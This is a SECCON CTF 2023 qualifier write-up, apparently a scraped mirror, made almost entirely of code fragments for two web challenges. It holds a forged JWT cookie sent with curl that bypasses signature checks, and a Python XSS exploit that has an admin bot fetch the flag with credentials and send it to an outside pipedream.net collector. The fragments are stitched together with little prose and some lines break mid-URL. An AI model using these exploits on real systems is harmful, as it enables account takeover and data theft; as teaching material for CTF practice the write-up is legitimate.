# SECCON CTF 2023 Quals Writeup/Upsolves

> 原文: https://www.ctfiot.com/136184.html
> ID: 136184


```
// jwt.js
const verify = (token, secret) => {
	const { header, payload, signature: expected_signature } = parseToken(token);

	const calculated_signature = createSignature(header, payload, secret);

	const calculated_buf = Buffer.from(calculated_signature, 'base64');
	const expected_buf = Buffer.from(expected_signature, 'base64');

	if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error('Invalid signature');
	}

	return payload;
}
// jwt.js
const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret);
	return signature;
}

const algorithms = {
	hs256: (data, secret) =>
 base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) =>
 base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

const stringifyPart = (obj) => {
	return base64UrlEncode(JSON.stringify(obj));
}

// index.js
const secret = require('crypto').randomBytes(32).toString('hex');
curl http://bad-jwt.seccon.games:
3000/ \
 -H "Cookie: session=eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ%3D%3D"
const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
const params = new URLSearchParams(location.search);
const result = eval(params.get('expr')); // query parameterのexprをeval
document.getElementById('result').innerText = result.toString(); // 結果をid=resultのDOMのinnerTextに格納
<!-- /tmp/script.html -->
<script>console.log('script.html is loaded.');</script>
<!-- /tmp/index.html -->
<!DOCTYPE html>
index.html
from urllib.parse import urlencode
import requests

target_url = "http://simplecalc.seccon.games:
3000"
attacker_url = "https://eoljd6ta1qq0d9f.m.pipedream.net"

payload = f"""
var i=document.createElement('iframe');
i.src = `/js/index.js?expr=${{'a'.repeat(20000)}}`;
i.onload = () => {{
i.contentWindow.fetch('/flag', {{headers: {{'X-FLAG': true}}, credentials: 'include'}}).then(res=>res.text()).then(res=>location.href='{attacker_url}?q='+res);
}};
document.body.appendChild(i);
"""
payload = urlencode({"expr": payload})
resp = requests.post(
 f"{target_url}/report",
 headers={"Content-Type": "application/x-www-form-urlencoded"},
 data=payload,
)
```
